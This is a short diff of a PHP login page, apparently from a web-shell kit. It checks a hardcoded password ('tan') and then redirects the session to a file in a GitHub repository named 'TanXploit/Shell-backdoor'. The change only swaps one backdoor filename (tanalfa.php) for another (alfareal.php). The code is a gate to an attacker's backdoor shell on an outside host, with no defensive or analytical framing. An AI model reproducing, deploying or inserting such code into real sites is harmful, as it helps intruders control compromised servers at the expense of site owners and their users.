@@ -3,7 +3,7 @@ session_start();
 
 // Jika sudah login, langsung redirect
 if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    header("Location: https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/tanalfa.php");
+    header("Location: https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/alfareal.php");
     exit;
 }
 
@@ -12,7 +12,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = $_POST['password'];
     if ($password === 'tan') {
         $_SESSION['loggedin'] = true;
-        header("Location: https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/tanalfa.php");
+        header("Location: https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/alfareal.php");
         exit;
     } else {
         $error = "Password salah!";
